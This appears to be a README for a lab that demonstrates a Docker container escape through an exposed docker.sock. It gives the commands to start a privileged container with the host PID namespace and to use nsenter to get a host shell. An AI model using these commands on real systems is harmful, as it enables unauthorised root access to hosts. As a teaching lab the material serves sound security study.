# docker.sock Escape

This is an example of a docker.sock escape. This is a vulernable configuration of docker containers that allows a user with command line acess to very easily escape to the hsot system.

## Set-Up

Run the following command to get put into the vulnernable docker container


```
docker compose run -it exploit /bin/bash
```

## Escape

To escape there are two steps to this escape, first you build a more vulnerable container and then you escape from it onto the host system.

### Build More Vulnerable Container

The following command builds a priviledged container that has access to all of those host pids.

```
docker run -it --rm --pid=host --privileged ubuntu bash
```

### Exploit that container

I cannot explain exactly how this command works, but it does. The gist of it is that you are able to enter the namespace of the host system and run bash giving you a shell.

```
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

For more info on this kinds of attack, this is a great resource: 
* https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation